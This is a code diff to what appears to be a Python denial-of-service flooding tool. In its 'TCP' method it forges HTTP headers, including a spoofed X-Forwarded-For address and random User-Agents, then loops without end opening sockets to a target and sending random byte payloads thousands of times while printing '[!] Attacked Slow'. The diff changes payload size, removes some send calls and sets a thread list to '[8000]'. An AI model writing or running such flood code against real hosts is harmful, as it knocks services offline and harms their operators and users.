@@ -416,17 +416,13 @@ if method == "TCP":
         httpss = "User-Agent: " + random.choice(https) + "\r\n"
         connection += "X-Forwarded-For: " + spoofer() + "\r\n"
         request = get_host + post_host + httpss + mozila + socks3 + referer + content + socks + forward + forwards + accept + connection + connection + "\r\n"
-        grtools = random._urandom(50411)
+        grtools = random._urandom(7411)
         while True:
             try:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                 sock.connect((ip, port))
                 for _ in range(7000):
-                    sock.send(grtools)
-                    sock.send(grtools)
-                    sock.send(grtools)
-                    sock.send(grtools)
                     sock.send(grtools)
                     sock.send(grtools)
                     s.sendall(str.encode(request))
@@ -436,7 +432,7 @@ if method == "TCP":
                 print("[!] Attacked Slow ")
                 sock.close()
                 
-    threads = []
+    threads = [8000]
     for _ in range(th):
         if method == "TCP":
             t = threading.Thread(target=tcpfl)
